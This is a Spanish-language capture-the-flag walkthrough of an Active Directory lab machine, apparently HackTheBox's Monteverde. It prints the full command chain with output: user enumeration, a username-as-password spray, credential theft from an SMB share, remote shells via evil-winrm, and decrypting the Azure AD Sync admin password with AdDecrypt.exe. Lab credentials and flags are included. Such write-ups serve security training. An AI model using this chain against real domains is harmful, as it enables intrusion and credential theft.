# Enumeration

>Comenzamos con un escaneo de puertos empleando el script de escaneo automático de puertos TCP creado por mí:

```bash
┌──(kali㉿jbkira)-[~]
└─$ sudo AutoNmap.sh 10.129.26.122                                               
AutoNmap By JBKira
Puertos TCP abiertos:
53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49676,49696,65017
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-06 17:33:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
65017/tcp open  msrpc         Microsoft Windows RPC
|_clock-skew: 3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-06T17:34:30
|_  start_date: N/A
```

>Comprobamos la versión de windows y el nombre de dominio del active directory con crackmapexec:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.26.122                                                  
SMB         10.129.26.122   445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
```

>Ponemos el dominio en nuestro /etc/hosts:

```bash
┌──(kali㉿jbkira)-[~]
└─$ echo '10.129.26.122 MEGABANK.LOCAL' >> /etc/hosts
```

>Nos logueamos de forma anónima al RPC y vemos que podemos enumerar usuarios del dominio:

```bash
┌──(kali㉿jbkira)-[~]
└─$ rpcclient -U "" -N 10.129.26.122
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

>Vamos a tratar la salida del comando y guardarla en un archivo para tenerlo como lista de usuarios válidos:

```bash
┌──(kali㉿jbkira)-[~]
└─$ cat usuarios | awk '{print $2}' FS=":" | awk '{print $1}' FS=" " | tr -d '[]' > validusers
```

>Comprobamos que son usuarios válidos con kerbrute:

```bash
┌──(kali㉿jbkira)-[~]
└─$ kerbrute userenum --dc 10.129.26.122 -v validusers -d MEGABANK.LOCAL

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/06/25 - Ronnie Flathers @ropnop

2025/04/06 13:44:40 >  Using KDC(s):
2025/04/06 13:44:40 >   10.129.26.122:88

2025/04/06 13:44:40 >  [+] VALID USERNAME:       mhope@MEGABANK.LOCAL
2025/04/06 13:44:40 >  [+] VALID USERNAME:       AAD_987d7f2f57d2@MEGABANK.LOCAL
2025/04/06 13:44:40 >  [+] VALID USERNAME:       SABatchJobs@MEGABANK.LOCAL
2025/04/06 13:44:40 >  [+] VALID USERNAME:       svc-ata@MEGABANK.LOCAL
2025/04/06 13:44:40 >  [+] VALID USERNAME:       svc-bexec@MEGABANK.LOCAL
2025/04/06 13:44:40 >  [+] VALID USERNAME:       svc-netapp@MEGABANK.LOCAL
2025/04/06 13:44:40 >  [+] VALID USERNAME:       roleary@MEGABANK.LOCAL
2025/04/06 13:44:40 >  [+] VALID USERNAME:       dgalanos@MEGABANK.LOCAL
2025/04/06 13:44:40 >  [!] Guest@MEGABANK.LOCAL - USER LOCKED OUT
2025/04/06 13:44:40 >  [+] VALID USERNAME:       smorgan@MEGABANK.LOCAL
2025/04/06 13:44:40 >  Done! Tested 10 usernames (9 valid) in 0.070 seconds
```

>Ninguno es vulnerable a ASREP-ROAST:

```bash
┌──(kali㉿jbkira)-[~]
└─$ impacket-GetNPUsers -no-pass -usersfile validusers MEGABANK.LOCAL/ 2>/dev/null
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
```

>Vamos a realizar un password spray empleando como contraseña el propio nombre de cada usuario y vemos que ya tenemos un usuario con el que tener un foothold en el dominio:

```bash
┌──(kali㉿jbkira)-[~]
└─$ kerbrute passwordspray --dc 10.129.26.122 -v validusers --user-as-pass -d MEGABANK.LOCAL

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/06/25 - Ronnie Flathers @ropnop

2025/04/06 13:46:25 >  Using KDC(s):
2025/04/06 13:46:25 >   10.129.26.122:88

2025/04/06 13:46:25 >  [!] Guest@MEGABANK.LOCAL:Guest - USER LOCKED OUT
2025/04/06 13:46:26 >  [!] AAD_987d7f2f57d2@MEGABANK.LOCAL:AAD_987d7f2f57d2 - Invalid password
2025/04/06 13:46:26 >  [!] dgalanos@MEGABANK.LOCAL:dgalanos - Invalid password
2025/04/06 13:46:26 >  [!] smorgan@MEGABANK.LOCAL:smorgan - Invalid password
2025/04/06 13:46:26 >  [!] roleary@MEGABANK.LOCAL:roleary - Invalid password
2025/04/06 13:46:26 >  [!] svc-netapp@MEGABANK.LOCAL:svc-netapp - Invalid password
2025/04/06 13:46:26 >  [!] svc-ata@MEGABANK.LOCAL:svc-ata - Invalid password
2025/04/06 13:46:26 >  [!] mhope@MEGABANK.LOCAL:mhope - Invalid password
2025/04/06 13:46:26 >  [!] svc-bexec@MEGABANK.LOCAL:svc-bexec - Invalid password
2025/04/06 13:46:26 >  [+] VALID LOGIN:  SABatchJobs@MEGABANK.LOCAL:SABatchJobs
2025/04/06 13:46:26 >  Done! Tested 10 logins (1 successes) in 0.281 seconds
```

>Vemos que efectivamente que las credenciales son válidas:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.26.122 -u 'SABatchJobs' -p 'SABatchJobs'
SMB         10.129.26.122   445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.26.122   445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

>Hacemos un ldapdomaindump para enumerar todo el dominio:

```bash
┌──(kali㉿jbkira)-[~]
└─$ ldapdomaindump -u 'MEGABANK.LOCAL\SABatchJobs' -p 'SABatchJobs' 10.129.26.122
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

>Movemos esto al /var/www/html y encendemos el servicio de apache2:

```bash
┌──(kali㉿jbkira)-[~]
└─$ sudo mv domain_* /var/www/html

┌──(kali㉿jbkira)-[/var/www/html]
└─$ sudo service apache2 start
```

>No vemos ningún grupo interesante al que pertenezca el usuario que obtuvimos pero vemos un usuario interesante llamado mhope que pertenece al grupo de Remote Management Users, por lo que vamos a enumerar los recursos compartidos por SMB a los que tenga acceso nuestro usuario:

```bash
┌──(kali㉿jbkira)-[/var/www/html]
└─$ smbclient -L \\\\10.129.26.122\\ -U "MEGABANK.LOCAL\SABatchJobs"
Password for [MEGABANK.LOCAL\SABatchJobs]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        azure_uploads   Disk      
        C$              Disk      Default share
        E$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        users$          Disk      

```

>Vamos a conectarnos al de users$ y enumerarlo ya que parece interesante:

```bash
┌──(kali㉿jbkira)-[/var/www/html]
└─$ smbclient \\\\10.129.26.122\\users$ -U "MEGABANK.LOCAL\SABatchJobs"
Password for [MEGABANK.LOCAL\SABatchJobs]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020

                31999 blocks of size 4096. 28979 blocks available

```

>Vemos un directorio con el nombre del usuario interesante, dentro hay un archivo xml que puede contener contraseñas así que vamos a llevarnoslo:

```bash
smb: \> cd mhope
smb: \mhope\> ls
  .                                   D        0  Fri Jan  3 08:41:18 2020
  ..                                  D        0  Fri Jan  3 08:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \mhope\> get azure.xml
getting file \mhope\azure.xml of size 1212 as azure.xml (4.4 KiloBytes/sec) (average 4.4 KiloBytes/sec)

```

>Al abrirlo, efectivamente hay unas credenciales:

```bash
┌──(kali㉿jbkira)-[~]
└─$ cat azure.xml                   
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>  
```

>Vamos a probarlas para iniciar sesión como mhope y vemos que ya tenemos acceso a su cuenta:

```bash
┌──(kali㉿jbkira)-[~]
└─$ crackmapexec smb 10.129.26.122 -u 'mhope' -p '4n0therD4y@n0th3r$'          
SMB         10.129.26.122   445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.26.122   445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$
```

>Por lo que ya al pertenecer el usuario al grupo Remote Management Users podremos entrar mediante evil-winrm al controlador de dominio:

```bash
┌──(kali㉿jbkira)-[~]
└─$ evil-winrm -i 10.129.26.122 -u 'mhope' -p '4n0therD4y@n0th3r$'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                     
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                       
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents> 

```

>Aquí vemos el user.txt:

```bash
*Evil-WinRM* PS C:\Users\mhope\Desktop> cat user.txt
08fda06142c74306286f4a9c2fe8bdbc
```

# Privilege Escalation

>Para escalar privilegios vamos a enumerar con bloodhound-python el dominio:

```bash
┌──(kali㉿jbkira)-[~]
└─$ bloodhound-python -ns 10.129.26.122 -u 'mhope' -p '4n0therD4y@n0th3r$' -d MEGABANK.LOCAL -c all
INFO: Found AD domain: megabank.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (MONTEVERDE.MEGABANK.LOCAL:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: MONTEVERDE.MEGABANK.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: MONTEVERDE.MEGABANK.LOCAL
INFO: Found 13 users
INFO: Found 65 groups
INFO: Found 2 gpos
INFO: Found 9 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: MONTEVERDE.MEGABANK.LOCAL
INFO: Done in 00M 14S
```

>Comprimimos en un zip todos los archivos json del comando anterior:

```bash
┌──(kali㉿jbkira)-[~]
└─$ zip megabank.local.zip 2025* 
  adding: 20250406140555_computers.json (deflated 75%)
  adding: 20250406140555_containers.json (deflated 93%)
  adding: 20250406140555_domains.json (deflated 76%)
  adding: 20250406140555_gpos.json (deflated 85%)
  adding: 20250406140555_groups.json (deflated 95%)
  adding: 20250406140555_ous.json (deflated 91%)
  adding: 20250406140555_users.json (deflated 94%)
```

>Encendemos el servicio de neo4j para poder importar el zip en bloodhound:

```bash
┌──(kali㉿jbkira)-[~]
└─$ sudo neo4j start        
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:25928). It is available at http://localhost:7474
There may be a short delay until the server is ready.

```

>Abrimos bloodhound:

```bash
┌──(kali㉿jbkira)-[~]
└─$ bloodhound &>/dev/null & disown                                                                 
[1] 25512
```

>Subimos el zip arrastrándolo desde una carpeta para que no de error:

![Image](https://github.com/user-attachments/assets/951e377b-a413-465b-af89-5104e3a4a4af)

>Vemos que el usuario es miembro del grupo Azure Admins:

![Image](https://github.com/user-attachments/assets/6154c83e-7e82-4b4a-8331-742c4d3219e6)

>Este grupo permite que si existe el siguiente directorio, se pueda desencriptar la contraseña del usuario Administrador:

![Image](https://github.com/user-attachments/assets/53d5598f-ae0a-4f63-8762-e8b1a8a638d8)

>Al existir el directorio, vamos a descargar y subir el siguiente exploit para aprovecharnos de esta vulnerabilidad: https://github.com/VbScrub/AdSyncDecrypt/releases/tag/v1.0

```bash
┌──(kali㉿jbkira)-[~]
└─$ wget https://github.com/VbScrub/AdSyncDecrypt/releases/download/v1.0/AdDecrypt.zip 

┌──(kali㉿jbkira)-[~]
└─$ unzip AdDecrypt.zip 
Archive:  AdDecrypt.zip
  inflating: AdDecrypt.exe           
  inflating: mcrypt.dll

*Evil-WinRM* PS C:\Windows\Temp> upload /home/kali/AdDecrypt.exe
                                        
Info: Uploading /home/kali/AdDecrypt.exe to C:\Windows\Temp\AdDecrypt.exe
                                        
Data: 19796 bytes of 19796 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Windows\Temp> upload /home/kali/mcrypt.dll
                                        
Info: Uploading /home/kali/mcrypt.dll to C:\Windows\Temp\mcrypt.dll
                                        
Data: 445664 bytes of 445664 bytes copied
                                        
Info: Upload successful!

```

>Vamos a la ubicación "C:\Program Files\Microsoft Azure AD Sync\bin" y lanzamos el exploit de la siguiente forma y obtendremos las credenciales del usuario administrador:

```powershell
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\bin> C:\Windows\Temp\AdDecrypt.exe -fullSQL

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```

>Iniciamos sesión como el usuario administrador desde evil-winrm:

```bash
┌──(kali㉿jbkira)-[~]
└─$ evil-winrm -i 10.129.26.122 -u 'administrator' -p 'd0m@in4dminyeah!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

>Y abrimos la root.txt flag:

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
c86e3ed14e0dd801da3e226f3cdb7e5e
```

